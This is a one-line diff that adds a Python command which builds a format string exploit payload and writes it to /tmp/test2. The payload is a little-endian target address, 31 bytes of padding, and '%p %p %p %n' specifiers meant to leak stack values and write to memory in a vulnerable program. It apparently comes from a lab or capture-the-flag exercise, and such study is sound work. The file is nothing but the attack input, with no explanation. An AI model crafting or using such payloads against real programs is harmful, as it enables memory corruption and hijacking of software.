@@ -1,0 +1,1 @@
+python -c 'print("\x08\x04\x98\x8c"[::-1] +"a"*31 + " %p %p %p %n")' > /tmp/test2
